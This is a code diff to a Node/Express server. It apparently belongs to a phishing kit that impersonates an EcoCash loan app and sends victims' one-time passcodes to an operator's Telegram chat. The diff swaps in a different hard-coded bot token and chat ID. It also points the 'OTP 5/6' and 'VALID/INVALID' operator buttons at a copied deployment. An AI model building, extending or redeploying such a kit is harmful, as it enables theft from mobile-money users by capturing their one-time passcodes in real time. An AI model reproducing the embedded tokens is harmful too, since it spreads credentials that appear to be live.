@@ -18,8 +18,8 @@ app.use(express.static(path.join(__dirname, "public")));
 // TELEGRAM CONFIG (PUT YOURS)
 // ==============================
 // --- TELEGRAM CONFIG ---
-const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
-const CHAT_ID = "7162306402";
+const TELEGRAM_TOKEN = "8782964536:AAGfUfQdo84z3wziZZs8WGzRtXQ7XTSPfU4";
+const CHAT_ID = "6391938178";
 
 
 // ==============================
@@ -41,8 +41,8 @@ async function sendToTelegram(message) {
       reply_markup: {
   inline_keyboard: [
     [
-      { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
-      { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
+      { text: "OTP 5", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=otp5" },
+      { text: "OTP 6", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=otp6" }
     ]
   ]
 }
@@ -64,8 +64,8 @@ async function sendOTPToTelegram(message) {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
-            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
+            { text: "✅ VALID", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=valid" },
+            { text: "❌ INVALID", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=invalid" }
           ]
         ]
       }
